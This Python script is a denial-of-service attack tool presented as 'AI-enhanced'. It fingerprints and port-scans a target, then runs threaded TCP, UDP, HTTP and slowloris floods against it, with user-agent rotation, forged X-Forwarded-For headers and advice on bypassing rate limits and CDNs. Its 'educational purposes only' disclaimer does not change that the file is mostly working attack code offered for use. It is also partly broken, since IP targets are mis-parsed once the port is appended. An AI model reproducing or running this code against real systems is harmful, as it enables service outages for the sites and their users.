#!/usr/bin/env python3
"""
AI-Enhanced Basic DDOS Attack Script with URL Support
Author: Lxkhaninkali-Enhanced Ai
Description: Intelligent distributed DOS attack with machine learning adaptation and comprehensive URL targeting
Educational Purpose Only - Use responsibly and legally
Features: AI-driven attack patterns, URL parsing, adaptive targeting, ML-based optimization
"""

import socket
import sys
import time
import random
import threading
import subprocess
import urllib.parse
import ssl
import json
import pickle
import hashlib
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Tuple, Optional
from collections import deque
import requests

# AI/ML imports for intelligent behavior
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False
    print("[!] NumPy not available - Using basic statistics")

class AIEnhancedBasicDDOS:
    def __init__(self, target):
        self.target_url = None
        self.target_ip = None
        self.target_port = None
        self.target_path = '/'
        self.use_https = False
        self.target_host = None
        self.target_scheme = None
        
        # Parse target (URL or IP)
        self._parse_target(target)
        
        self.packets_sent = 0
        self.successful_connections = 0
        self.failed_connections = 0
        self.running = True
        self.attack_nodes = []
        
        # AI/ML components
        self.ai_engine = IntelligentAttackEngine()
        self.performance_history = deque(maxlen=100)
        self.success_rates = deque(maxlen=50)
        self.response_times = deque(maxlen=100)
        self.adaptive_strategies = []
        
        # URL-specific targeting
        self.discovered_endpoints = set()
        self.valid_paths = ['/']
        self.server_fingerprint = {}
        
        print(f"[*] AI-Enhanced DDOS initialized for {'URL' if self.target_url else 'IP'} targeting")
    
    def _parse_target(self, target):
        """Enhanced target parsing with comprehensive URL support"""
        if target.startswith('http://') or target.startswith('https://'):
            # URL targeting
            self.target_url = target
            parsed = urllib.parse.urlparse(target)
            
            self.target_scheme = parsed.scheme
            self.target_host = parsed.hostname
            self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            self.target_path = parsed.path or '/'
            self.use_https = parsed.scheme == 'https'
            
            # Resolve IP
            try:
                self.target_ip = socket.gethostbyname(self.target_host)
                print(f"[*] URL Target: {self.target_scheme}://{self.target_host}:{self.target_port}")
                print(f"[*] Resolved IP: {self.target_ip}")
                print(f"[*] Base path: {self.target_path}")
            except socket.gaierror as e:
                print(f"[!] Failed to resolve hostname {self.target_host}: {e}")
                sys.exit(1)
                
        else:
            # IP targeting
            self.target_ip = target
            self.target_port = 80  # Default, will be updated by caller if needed
            self.target_host = target
            self.use_https = False
            print(f"[*] IP Target: {self.target_ip}")
    
    def ai_target_reconnaissance(self) -> Dict:
        """AI-powered reconnaissance to gather intelligence about the target"""
        print(f"[*] AI Reconnaissance: Analyzing target {self.target_host}...")
        
        intel = {
            'server_type': 'unknown',
            'cms_detected': None,
            'security_headers': [],
            'rate_limiting': False,
            'cdn_detected': False,
            'load_balancer': False,
            'valid_endpoints': [],
            'vulnerability_indicators': []
        }
        
        if self.target_url:
            try:
                # Perform intelligent HTTP reconnaissance
                intel.update(self._http_reconnaissance())
                
                # Directory/endpoint discovery
                intel['valid_endpoints'] = self._discover_endpoints()
                
                # Security posture analysis
                intel['security_headers'] = self._analyze_security_headers()
                
                # Rate limiting detection
                intel['rate_limiting'] = self._detect_rate_limiting()
                
            except Exception as e:
                print(f"[!] Reconnaissance error: {e}")
        
        # Network-level reconnaissance  
        intel.update(self._network_reconnaissance())
        
        print(f"[+] Intelligence gathered: {len(intel['valid_endpoints'])} endpoints discovered")
        print(f"[+] Server type: {intel['server_type']}")
        if intel['rate_limiting']:
            print(f"[!] Rate limiting detected - adjusting attack strategy")
        
        self.server_fingerprint = intel
        return intel
    
    def _http_reconnaissance(self) -> Dict:
        """HTTP-based reconnaissance"""
        intel = {}
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (compatible; SecurityAudit/1.0)',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(self.target_url, headers=headers, timeout=5, verify=False)
            
            # Server identification
            server_header = response.headers.get('Server', '').lower()
            if 'apache' in server_header:
                intel['server_type'] = 'Apache'
            elif 'nginx' in server_header:
                intel['server_type'] = 'Nginx'
            elif 'iis' in server_header:
                intel['server_type'] = 'IIS'
            elif 'cloudflare' in server_header:
                intel['cdn_detected'] = True
                intel['server_type'] = 'Cloudflare-protected'
            
            # CMS detection
            content = response.text.lower()
            cms_indicators = {
                'wordpress': ['wp-content', 'wp-includes'],
                'drupal': ['drupal', '/sites/default'],
                'joomla': ['joomla', '/media/system'],
                'magento': ['magento', 'mage']
            }
            
            for cms, indicators in cms_indicators.items():
                if any(indicator in content for indicator in indicators):
                    intel['cms_detected'] = cms
                    break
            
            # Load balancer detection
            if 'X-Forwarded-For' in response.headers or 'X-Real-IP' in response.headers:
                intel['load_balancer'] = True
                
        except requests.RequestException as e:
            print(f"[!] HTTP reconnaissance failed: {e}")
        
        return intel
    
    def _discover_endpoints(self) -> List[str]:
        """Intelligent endpoint discovery"""
        endpoints = ['/']
        
        # Common endpoint wordlist
        common_paths = [
            '/admin', '/api', '/api/v1', '/api/v2', '/login', '/dashboard',
            '/wp-admin', '/wp-login.php', '/administrator', '/manager',
            '/config', '/backup', '/test', '/dev', '/staging', '/uploads',
            '/images', '/css', '/js', '/assets', '/static', '/files'
        ]
        
        # Intelligent path discovery based on server type
        if self.server_fingerprint.get('cms_detected') == 'wordpress':
            common_paths.extend(['/wp-content', '/wp-includes', '/xmlrpc.php'])
        elif self.server_fingerprint.get('cms_detected') == 'drupal':
            common_paths.extend(['/user', '/admin/content', '/node'])
        
        discovered = 0
        max_discoveries = 15  # Limit to avoid excessive reconnaissance
        
        for path in common_paths:
            if discovered >= max_discoveries:
                break
                
            try:
                url = f"{self.target_scheme}://{self.target_host}:{self.target_port}{path}"
                response = requests.head(url, timeout=3, verify=False)
                
                if response.status_code in [200, 301, 302, 403]:
                    endpoints.append(path)
                    discovered += 1
                    print(f"[+] Discovered endpoint: {path} ({response.status_code})")
                    
            except requests.RequestException:
                continue
        
        self.valid_paths = endpoints
        return endpoints
    
    def _analyze_security_headers(self) -> List[str]:
        """Analyze security headers"""
        security_headers = []
        
        try:
            response = requests.get(self.target_url, timeout=5, verify=False)
            headers = response.headers
            
            # Check for security headers
            security_checks = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-XSS-Protection': 'XSS protection', 
                'X-Content-Type-Options': 'MIME type sniffing protection',
                'Strict-Transport-Security': 'HSTS enabled',
                'Content-Security-Policy': 'CSP enabled',
                'X-Rate-Limit': 'Rate limiting headers'
            }
            
            for header, description in security_checks.items():
                if header in headers:
                    security_headers.append(description)
                    
        except requests.RequestException:
            pass
        
        return security_headers
    
    def _detect_rate_limiting(self) -> bool:
        """Detect if rate limiting is in place"""
        try:
            # Send rapid requests to test for rate limiting
            for _ in range(5):
                response = requests.get(self.target_url, timeout=2, verify=False)
                if response.status_code == 429:  # Too Many Requests
                    return True
                time.sleep(0.1)
        except requests.RequestException:
            pass
        
        return False
    
    def _network_reconnaissance(self) -> Dict:
        """Network-level reconnaissance"""
        intel = {'ping_response': False, 'open_ports': []}
        
        # Ping test
        try:
            result = subprocess.run(['ping', '-c', '2', self.target_ip], 
                                  capture_output=True, text=True, timeout=10)
            intel['ping_response'] = result.returncode == 0
        except:
            pass
        
        # Quick port scan of common ports
        common_ports = [22, 25, 53, 80, 110, 143, 443, 993, 995]
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()
                return port if result == 0 else None
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_port, port) for port in common_ports]
            for future in futures:
                port = future.result()
                if port:
                    intel['open_ports'].append(port)
        
        return intel
    
    def ai_adaptive_attack_strategy(self) -> Dict:
        """AI determines optimal attack strategy based on reconnaissance"""
        print("[*] AI Strategy Engine: Calculating optimal attack vectors...")
        
        strategy = {
            'primary_vector': 'tcp_syn',
            'secondary_vectors': ['udp_flood', 'http_flood'],
            'intensity': 'medium',
            'node_count': 10,
            'attack_duration': 60,
            'rate_limiting_bypass': False,
            'endpoint_targeting': False,
            'evasion_techniques': []
        }
        
        intel = self.server_fingerprint
        
        # Adapt based on server type
        if intel.get('server_type') == 'Cloudflare-protected':
            strategy['primary_vector'] = 'http_flood'
            strategy['evasion_techniques'].append('user_agent_rotation')
            strategy['evasion_techniques'].append('request_spacing')
            strategy['intensity'] = 'low'  # More stealthy against CDN
            
        elif intel.get('server_type') in ['Apache', 'Nginx']:
            strategy['primary_vector'] = 'tcp_syn'
            strategy['secondary_vectors'].append('slowloris')
            strategy['intensity'] = 'high'
            
        # Adapt to rate limiting
        if intel.get('rate_limiting'):
            strategy['rate_limiting_bypass'] = True
            strategy['evasion_techniques'].append('ip_rotation')
            strategy['evasion_techniques'].append('request_timing_variation')
            strategy['node_count'] = min(strategy['node_count'] * 2, 25)  # More nodes, lower per-node rate
        
        # URL-specific targeting
        if self.target_url and len(self.valid_paths) > 1:
            strategy['endpoint_targeting'] = True
            strategy['secondary_vectors'].append('endpoint_enumeration_flood')
        
        # Adaptive intensity based on open ports
        open_port_count = len(intel.get('open_ports', []))
        if open_port_count > 5:
            strategy['intensity'] = 'high'  # Many services running
        elif open_port_count < 2:
            strategy['intensity'] = 'medium'  # Hardened target
        
        self.ai_engine.current_strategy = strategy
        print(f"[+] AI Strategy: {strategy['primary_vector']} with {len(strategy['secondary_vectors'])} secondary vectors")
        print(f"[+] Intensity: {strategy['intensity']}, Nodes: {strategy['node_count']}")
        
        return strategy
    
    def intelligent_attack_node(self, node_id, strategy, duration=60):
        """AI-enhanced attack node with adaptive behavior"""
        print(f"[*] AI Node {node_id} starting with strategy: {strategy['primary_vector']}")
        
        start_time = time.time()
        local_packets = 0
        local_successes = 0
        
        # Node-specific intelligence
        node_performance = {
            'success_rate': 0.0,
            'avg_response_time': 0.0,
            'consecutive_failures': 0
        }
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # AI decides attack vector for this iteration
                attack_vector = self.ai_engine.select_attack_vector(node_performance, strategy)
                
                # Execute selected attack
                attack_start = time.time()
                success = False
                
                if attack_vector == 'tcp_syn':
                    success = self.enhanced_tcp_attack(node_id, strategy)
                elif attack_vector == 'udp_flood':
                    success = self.enhanced_udp_attack(node_id, strategy)
                elif attack_vector == 'http_flood':
                    success = self.enhanced_http_attack(node_id, strategy)
                elif attack_vector == 'slowloris':
                    success = self.slowloris_attack(node_id, strategy)
                elif attack_vector == 'endpoint_enumeration_flood':
                    success = self.endpoint_flood_attack(node_id, strategy)
                
                attack_duration = time.time() - attack_start
                
                # Update node performance metrics
                local_packets += 1
                if success:
                    local_successes += 1
                    node_performance['consecutive_failures'] = 0
                else:
                    node_performance['consecutive_failures'] += 1
                
                node_performance['success_rate'] = local_successes / local_packets
                node_performance['avg_response_time'] = attack_duration
                
                # AI-driven adaptive delay
                delay = self.ai_engine.calculate_adaptive_delay(
                    node_performance, strategy, attack_vector
                )
                time.sleep(delay)
                
                # Report to global stats
                self.packets_sent += 1
                if success:
                    self.successful_connections += 1
                else:
                    self.failed_connections += 1
                
            except Exception as e:
                node_performance['consecutive_failures'] += 1
        
        print(f"[*] AI Node {node_id} completed: {local_packets} attacks, {node_performance['success_rate']:.2%} success rate")
        return local_packets
    
    def enhanced_tcp_attack(self, node_id, strategy):
        """Enhanced TCP attack with evasion"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # AI-driven socket options
            if 'socket_reuse' in strategy.get('evasion_techniques', []):
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Timeout based on strategy intensity
            timeout_map = {'low': 1, 'medium': 0.5, 'high': 0.2}
            sock.settimeout(timeout_map.get(strategy['intensity'], 0.5))
            
            # Random source port for evasion
            source_port = random.randint(1024, 65535)
            
            sock.connect((self.target_ip, self.target_port))
            sock.close()
            return True
            
        except:
            return False
    
    def enhanced_udp_attack(self, node_id, strategy):
        """Enhanced UDP attack with intelligent payload"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Intelligent payload generation
            payload_size = random.randint(64, 512)
            if strategy['intensity'] == 'high':
                payload_size = random.randint(512, 1024)
            
            # AI-crafted payload patterns
            payload_types = [
                b'A' * payload_size,  # Basic flood
                bytes([random.randint(0, 255) for _ in range(payload_size)]),  # Random
                b'DNS_AMPLIFY_' * (payload_size // 12),  # DNS-like
                b'NTP_REQUEST_' * (payload_size // 12)   # NTP-like
            ]
            
            payload = random.choice(payload_types)
            sock.sendto(payload, (self.target_ip, self.target_port))
            sock.close()
            return True
            
        except:
            return False
    
    def enhanced_http_attack(self, node_id, strategy):
        """Enhanced HTTP attack with URL support and evasion"""
        if not self.target_url:
            return self.enhanced_tcp_attack(node_id, strategy)
        
        try:
            # AI-selected user agent
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
                f'AIBot-{node_id}/1.0 (Educational; +https://htb.academy)',
                f'SecurityTest-{node_id} (Penetration Testing Tool)'
            ]
            
            if 'user_agent_rotation' in strategy.get('evasion_techniques', []):
                user_agent = random.choice(user_agents)
            else:
                user_agent = user_agents[0]
            
            # Intelligent path selection
            target_path = self.target_path
            if strategy.get('endpoint_targeting') and self.valid_paths:
                target_path = random.choice(self.valid_paths)
            
            # Add query parameters for variety
            query_params = [
                f'?id={random.randint(1, 10000)}',
                f'?token={random.randint(1000, 9999)}', 
                f'?page={random.randint(1, 100)}',
                f'?search={random.choice(["test", "data", "load", "stress"])}',
                f'?timestamp={int(time.time())}'
            ]
            
            if random.random() < 0.7:  # 70% chance to add query params
                target_path += random.choice(query_params)
            
            # Create connection
            if self.use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                ssl_sock = context.wrap_socket(sock, server_hostname=self.target_host)
                ssl_sock.connect((self.target_ip, self.target_port))
                connection = ssl_sock
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, self.target_port))
                connection = sock
            
            # HTTP methods variation
            methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
            method = random.choice(methods) if strategy['intensity'] == 'high' else 'GET'
            
            # Craft request
            request = f"{method} {target_path} HTTP/1.1\r\n"
            request += f"Host: {self.target_host}\r\n"
            request += f"User-Agent: {user_agent}\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            request += "Accept-Language: en-US,en;q=0.5\r\n"
            request += "Accept-Encoding: gzip, deflate\r\n"
            
            # Evasion headers
            if 'request_spacing' in strategy.get('evasion_techniques', []):
                request += f"X-Forwarded-For: {self._generate_fake_ip()}\r\n"
                request += f"X-Real-IP: {self._generate_fake_ip()}\r\n"
            
            request += "Connection: close\r\n\r\n"
            
            # Send request
            connection.send(request.encode())
            
            # Read response for realistic behavior
            try:
                response = connection.recv(1024)
                success = b'HTTP/' in response
            except:
                success = True  # Connection successful even if response failed
            
            connection.close()
            return success
            
        except Exception as e:
            return False
    
    def slowloris_attack(self, node_id, strategy):
        """Slowloris attack implementation"""
        try:
            connections = []
            
            # Create multiple partial connections
            for _ in range(random.randint(5, 15)):
                if self.use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False  
                    context.verify_mode = ssl.CERT_NONE
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    ssl_sock = context.wrap_socket(sock, server_hostname=self.target_host)
                    ssl_sock.connect((self.target_ip, self.target_port))
                    conn = ssl_sock
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target_ip, self.target_port))
                    conn = sock
                
                # Send partial HTTP request
                partial_request = f"GET {self.target_path} HTTP/1.1\r\n"
                partial_request += f"Host: {self.target_host}\r\n"
                partial_request += "User-Agent: SlowLoris-AI/1.0\r\n"
                
                conn.send(partial_request.encode())
                connections.append(conn)
            
            # Keep connections alive for a short period
            for _ in range(3):
                for conn in connections[:]:
                    try:
                        conn.send(b"X-Keep-Alive: timeout=5\r\n")
                    except:
                        connections.remove(conn)
                time.sleep(1)
            
            # Clean up
            for conn in connections:
                try:
                    conn.close()
                except:
                    pass
            
            return len(connections) > 0
            
        except:
            return False
    
    def endpoint_flood_attack(self, node_id, strategy):
        """Flood discovered endpoints"""
        if not self.valid_paths or not self.target_url:
            return self.enhanced_http_attack(node_id, strategy)
        
        success_count = 0
        total_attempts = random.randint(3, 7)
        
        for _ in range(total_attempts):
            endpoint = random.choice(self.valid_paths)
            
            # Temporarily change target path
            original_path = self.target_path
            self.target_path = endpoint
            
            # Execute HTTP attack on this endpoint
            if self.enhanced_http_attack(node_id, strategy):
                success_count += 1
            
            # Restore original path
            self.target_path = original_path
            
            time.sleep(0.1)  # Brief delay between endpoint attacks
        
        return success_count > 0
    
    def _generate_fake_ip(self):
        """Generate fake IP for evasion headers"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def ai_performance_monitoring(self, duration):
        """AI monitors and adjusts attack performance in real-time"""
        print("[*] AI Performance Monitor: Starting real-time optimization...")
        
        start_time = time.time()
        last_stats_time = start_time
        
        while self.running and (time.time() - start_time) < duration:
            current_time = time.time()
            
            # Calculate performance metrics
            if current_time - last_stats_time >= 5:  # Every 5 seconds
                time_elapsed = current_time - last_stats_time
                
                # Calculate rates
                packets_rate = self.packets_sent / (current_time - start_time)
                success_rate = self.successful_connections / max(1, self.packets_sent)
                
                # Store in history
                self.performance_history.append({
                    'timestamp': current_time,
                    'packets_rate': packets_rate,
                    'success_rate': success_rate,
                    'total_packets': self.packets_sent
                })
                
                print(f"[+] AI Monitor: {packets_rate:.1f} pps, {success_rate:.2%} success, {self.packets_sent} total")
                
                # AI performance optimization
                if len(self.performance_history) >= 3:
                    self.ai_engine.optimize_performance(self.performance_history)
                
                last_stats_time = current_time
            
            time.sleep(1)
    
    def launch_ai_enhanced_attack(self, duration=60):
        """Launch the complete AI-enhanced DDOS attack"""
        print("="*80)
        print("AI-ENHANCED BASIC DDOS ATTACK WITH COMPREHENSIVE URL SUPPORT")
        print("="*80)
        print(f"Target: {self.target_url or self.target_ip}")
        print(f"Protocol: {'HTTPS' if self.use_https else 'HTTP' if self.target_url else 'TCP'}")
        print(f"AI Features: Enabled")
        print("="*80)
        
        self.attack_start_time = time.time()
        
        # Phase 1: AI Reconnaissance
        print("\n[PHASE 1: AI RECONNAISSANCE]")
        intel = self.ai_target_reconnaissance()
        
        # Phase 2: AI Strategy Planning
        print("\n[PHASE 2: AI STRATEGY OPTIMIZATION]")
        strategy = self.ai_adaptive_attack_strategy()
        
        # Phase 3: Coordinated AI Attack
        print(f"\n[PHASE 3: AI-COORDINATED ATTACK - {duration}s]")
        
        with ThreadPoolExecutor(max_workers=strategy['node_count'] + 1) as executor:
            futures = []
            
            # Start AI performance monitor
            monitor_future = executor.submit(self.ai_performance_monitoring, duration)
            futures.append(monitor_future)
            
            # Launch AI attack nodes
            for node_id in range(1, strategy['node_count'] + 1):
                future = executor.submit(
                    self.intelligent_attack_node, 
                    node_id, 
                    strategy, 
                    duration
                )
                futures.append(future)
            
            # Wait for completion
            for future in futures:
                try:
                    future.result(timeout=duration + 10)
                except Exception as e:
                    pass
        
        self.running = False
        
        # Phase 4: AI Analysis & Report
        print(f"\n[PHASE 4: AI PERFORMANCE ANALYSIS]")
        self.ai_attack_summary()
    
    def ai_attack_summary(self):
        """AI-generated attack summary and analysis"""
        total_time = time.time() - self.attack_start_time
        
        print("="*80)
        print("AI-ENHANCED ATTACK SUMMARY")
        print("="*80)
        
        # Basic statistics
        print(f"Duration: {total_time:.1f} seconds")
        print(f"Total packets: {self.packets_sent}")
        print(f"Successful connections: {self.successful_connections}")
        print(f"Failed connections: {self.failed_connections}")
        print(f"Average rate: {self.packets_sent / total_time:.1f} packets/sec")
        print(f"Success rate: {self.successful_connections / max(1, self.packets_sent):.2%}")
        
        # AI analysis
        if self.server_fingerprint:
            print(f"\nTarget Analysis:")
            print(f"  Server Type: {self.server_fingerprint.get('server_type', 'Unknown')}")
            print(f"  CMS Detected: {self.server_fingerprint.get('cms_detected', 'None')}")
            print(f"  Rate Limiting: {'Yes' if self.server_fingerprint.get('rate_limiting') else 'No'}")
            print(f"  Endpoints Discovered: {len(self.valid_paths)}")
        
        # Performance trends
        if len(self.performance_history) > 1:
            print(f"\nPerformance Trends:")
            initial_rate = self.performance_history[0]['packets_rate']
            final_rate = self.performance_history[-1]['packets_rate']
            trend = "↗" if final_rate > initial_rate else "↘" if final_rate < initial_rate else "→"
            print(f"  Rate Trend: {initial_rate:.1f} → {final_rate:.1f} pps {trend}")
        
        # AI recommendations
        print(f"\nAI Recommendations:")
        if self.server_fingerprint.get('rate_limiting'):
            print("  • Consider distributed attack from more nodes to bypass rate limiting")
        if self.server_fingerprint.get('cdn_detected'):
            print("  • Target appears to use CDN - consider direct IP targeting")
        if len(self.valid_paths) > 5:
            print("  • Multiple endpoints discovered - consider targeted resource exhaustion")
        
        print("="*80)


class IntelligentAttackEngine:
    """AI engine for attack optimization and adaptation"""
    
    def __init__(self):
        self.current_strategy = {}
        self.performance_history = []
        self.attack_effectiveness = {}
        
    def select_attack_vector(self, node_performance, strategy):
        """AI selects the most effective attack vector for current situation"""
        vectors = [strategy['primary_vector']] + strategy.get('secondary_vectors', [])
        
        # Simple AI: choose based on recent success rate
        if node_performance['consecutive_failures'] > 3:
            # Try different vector if current one is failing
            available_vectors = [v for v in vectors if v != strategy['primary_vector']]
            return random.choice(available_vectors) if available_vectors else strategy['primary_vector']
        
        # Bias towards primary vector but occasionally use others
        if random.random() < 0.7:
            return strategy['primary_vector']
        else:
            return random.choice(strategy.get('secondary_vectors', [strategy['primary_vector']]))
    
    def calculate_adaptive_delay(self, node_performance, strategy, attack_vector):
        """Calculate adaptive delay based on performance and evasion needs"""
        base_delays = {
            'low': (0.1, 0.5),
            'medium': (0.01, 0.1), 
            'high': (0.001, 0.05)
        }
        
        min_delay, max_delay = base_delays.get(strategy['intensity'], (0.01, 0.1))
        
        # Increase delay if too many failures (evasion)
        if node_performance['consecutive_failures'] > 2:
            min_delay *= 2
            max_delay *= 2
        
        # Decrease delay if very successful
        if node_performance['success_rate'] > 0.8:
            min_delay *= 0.5
            max_delay *= 0.5
        
        return random.uniform(min_delay, max_delay)
    
    def optimize_performance(self, history):
        """Analyze performance history and suggest optimizations"""
        if len(history) < 3:
            return
        
        # Simple trend analysis
        recent_rates = [h['packets_rate'] for h in history[-3:]]
        if HAS_NUMPY:
            # Use numpy for better analysis if available
            trend = np.polyfit(range(len(recent_rates)), recent_rates, 1)[0]
        else:
            # Simple trend calculation
            trend = (recent_rates[-1] - recent_rates[0]) / len(recent_rates)
        
        if trend < -10:  # Significant decline
            print("[!] AI detected performance decline - recommend strategy adjustment")
        elif trend > 10:  # Significant improvement
            print("[+] AI detected performance improvement - maintaining current strategy")


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ddos_basic_ai_enhanced.py <target_url_or_ip> [target_port] [duration]")
        print("Examples:")
        print("  python3 ddos_basic_ai_enhanced.py https://example.com 300")
        print("  python3 ddos_basic_ai_enhanced.py http://192.168.1.100:8080 300")
        print("  python3 ddos_basic_ai_enhanced.py 192.168.1.100 80 300")
        print("\nFeatures: AI-driven attacks, URL parsing, adaptive strategies, endpoint discovery")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = 60  # Default duration
    
    # Parse arguments based on whether it's a URL or IP
    if target.startswith('http://') or target.startswith('https://'):
        # URL provided
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
    else:
        # IP provided, need port
        if len(sys.argv) < 3:
            print("Error: Port required when using IP address")
            print("Usage: python3 ddos_basic_ai_enhanced.py <ip_address> <port> [duration]")
            sys.exit(1)
        
        target_port = int(sys.argv[2])
        duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
        
        # Reconstruct with port for parsing
        target = target + f":{target_port}"
    
    print("AI-ENHANCED BASIC DDOS ATTACK TOOL")
    print("=" * 50)
    print("Features: AI reconnaissance, adaptive strategies, comprehensive URL support")
    print("Educational and defensive testing purposes only!")
    print("=" * 50)
    
    # Safety confirmation
    confirm = input(f"\nContinue with AI-enhanced DDOS attack on {target}? (y/N): ")
    if confirm.lower() != 'y':
        print("[!] Attack cancelled by user")
        sys.exit(0)
    
    # Initialize and launch AI-enhanced attack
    ddos_attack = AIEnhancedBasicDDOS(target)
    
    try:
        ddos_attack.launch_ai_enhanced_attack(duration)
    except KeyboardInterrupt:
        print("\n[!] AI-enhanced attack interrupted by user")
        ddos_attack.running = False
    except Exception as e:
        print(f"\n[!] AI-enhanced attack error: {e}")
        ddos_attack.running = False

if __name__ == "__main__":
    main()
